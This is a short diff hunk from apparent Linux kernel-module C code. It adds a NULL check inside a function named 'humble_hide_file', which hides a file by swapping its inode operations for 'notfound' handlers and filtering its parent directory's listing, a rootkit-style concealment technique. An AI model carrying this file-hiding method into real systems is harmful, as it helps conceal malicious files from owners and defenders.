@@ -179,7 +179,10 @@ int humble_hide_file(const char *path, u64 *ino)
 	dest.dentry->d_inode->i_op = &notfound_iops;
 	dest.dentry->d_inode->i_fop = &notfound_fops;
 	dest.dentry->d_parent->d_inode->i_fop = &filtering_fops;
-	*ino = dest.dentry->d_inode->i_ino;
+
+	if (ino != NULL) {
+		*ino = dest.dentry->d_inode->i_ino;
+	}
 out:
 	dput(dest.dentry->d_parent);
 	dput(dest.dentry);
